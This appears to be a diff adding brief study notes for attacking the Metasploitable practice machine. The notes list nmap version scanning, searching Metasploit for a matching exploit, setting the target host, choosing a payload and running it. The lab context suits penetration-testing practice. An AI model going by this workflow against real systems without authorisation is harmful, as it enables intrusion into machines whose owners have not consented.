@@ -1,0 +1,10 @@
+Metasploitable
+- nmap ip - sV / nmap ip -p21 -sV
+- msfconsole (will open metasploit console)
+- search type:exploit 'version'
+- use 0
+- set RHOSTS 'machine's ip'
+- show payloads
+- use 0
+- show options (to check)
+- exploit
